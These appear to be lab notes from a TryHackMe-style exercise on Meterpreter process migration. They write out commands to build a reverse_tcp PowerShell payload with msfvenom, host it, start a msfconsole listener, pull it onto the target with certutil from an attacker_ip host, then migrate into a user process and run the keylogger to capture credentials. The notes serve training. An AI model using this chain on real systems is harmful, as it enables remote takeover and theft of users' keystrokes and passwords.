---
title: Meterpreter Migrate
updated: 2023-04-26T22:35:09.0000000+04:00
created: 2023-04-26T22:12:06.0000000+04:00
---

PM
Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM context. SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a Meterpreter shell. However for a quick rundown, you can use the following command to

1.  Generate a PowerShell meterpreter payload:

| Command | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1 |
|---------|------------------------------------------------------------------------------------------------------------|

![image1](image1-129.png)

2.  Hosting Python Webserver to host the created file.

![image2](image2-64.png)

| Command | Python3 -m http.server 8080 |
|---------|-----------------------------|

3.  You can then also use the following to create the associated listener in the msfconsole:

| Command | sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit" |
|---------|--------------------------------------------------------------------------------------------------------------------------------------------------------------|

![image3](image3-45.png)
### 
4.  Copy the hosted msfvenom file to the evilwin-rm session with certiutil:

| Command | certutil.exe -urlcache -split -f [http:///attacker_ip:8080/filename.ps1](http://attacker_ip:8080/filename.ps1) outputname.ps1 |
|---------|-------------------------------------------------------------------------------------------------------------------------------|

![image4](image4-32.png)

5.  Run the uploaded .ps1 script.

![image5](image5-22.png)

6.  After running, you should get a shell in the meterpreter session

![image6](image6-14.png)

7.  Check if the user, has any running processes

| Command | ps \| grep "explorer" |
|---------|-----------------------|

![image7](image7-11.png)

8.  Migrate to a process PID

| Command | Migrate PID_number |
|---------|--------------------|

- Migrate to a PID, that has the User you require to migrate to.

9.  Performing keylogging

![image8](image8-10.png)

